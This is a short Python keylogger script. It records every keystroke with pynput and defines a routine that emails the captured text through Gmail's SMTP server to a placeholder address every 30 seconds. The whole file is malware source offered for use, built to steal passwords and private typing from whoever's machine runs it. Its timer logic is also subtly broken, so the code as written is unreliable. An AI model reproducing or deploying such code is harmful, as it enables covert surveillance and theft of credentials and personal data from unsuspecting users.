import pynput.keyboard
import smtplib
import threading

logging=""
def pressing(key):
    global logging
    try:
        logging=logging+str(key.char)
    except AttributeError:
        if key==key.space:
            logging=logging+" "
        elif key==key.enter:
            logging=logging+"\n"
        else:
            logging=logging+str(key)
    print(logging)

def mail_sending(emailadress,paswd,message):
    email=smtplib.SMTP("smtp.gmail.com",587)
    email.starttls()
    email.login(emailadress,paswd)
    email.sendmail(emailadress,emailadress,message)
    email.quit()

keylogger=pynput.keyboard.Listener(on_press=pressing)

def mail_threading():
    global logging
    mail_sending("youmail@gmail.com","yourpasswd",logging.encode("utf-8"))
    logging=""
    timer=threading.Timer(30,mail_threading())
    timer.start()


#working on background and process working parallel
with keylogger:
    keylogger.join()





